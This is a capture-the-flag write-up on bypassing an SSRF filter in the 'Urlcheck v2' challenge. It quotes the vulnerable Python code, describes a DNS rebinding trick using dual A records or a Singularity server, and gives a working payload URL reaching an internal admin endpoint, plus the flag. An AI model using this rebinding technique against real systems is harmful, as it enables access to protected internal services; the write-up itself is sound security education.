## Urlcheck v2 (128 points, 108 solves)

The goal was to bypass a WAF again, but this time the IP adress was checked using [ipaddress](https://docs.python.org/3/library/ipaddress.html) library. 

```py
def valid_ip(ip):
    try:
        result = ipaddress.ip_address(ip)
        # Stay out of my private!
        return result.is_global
    except:
        return False

...

def get(url, recursive_count=0):
    r = requests.get(url, allow_redirects=False)
    if 'location' in r.headers:
        if recursive_count > 2:
            return '&#x1f914;'
        url = r.headers.get('location')
        if valid_fqdn(urlparse(url).netloc) == False:
            return '&#x1f914;'
        return get(url, recursive_count + 1)
    return r.text
```

Because the above code does two DNS resolves, first to check if private and second to request the resource, I simply added two A records to the DNS entry. 

| Type | Hostname          | Value         | TTL (seconds) |
| ---- | ----------------- | ------------- | ------------- |
| A    | double.terjanq.me | 127.0.0.1     | 30            |
| A    | double.terjanq.me | 51.38.138.162 | 30            |

After a few attempts I got a flag:

#### TWCTF{17_15_h4rd_70_55rf_m17164710n_47_4pp_l4y3r:(}

### More reliable solution
The way I solved the challenge relies on luck. You either get a correct order of DNS resolves or not. A more reliable way of solving is to set up your own DNS server which will first respond with *public IP* and then the *local* one. Since the attack is similar to DNS Rebinding, one can use [singularity](https://github.com/nccgroup/singularity) to set up such a server.

**Demo**
Singularity provides DEMO application, so you can reuse their IP addresses `s-35.185.206.165-127.0.0.1-RANDOM-fs-e.d.rebind.it`

http://urlcheck2.chal.ctf.westerns.tokyo/check-status?url=http://s-35.185.206.165-127.0.0.1-RANDOM-fs-e.d.rebind.it/admin-status

*Note: Replace `RANDOM` with something RANDOM, it should yield the flag instantly*
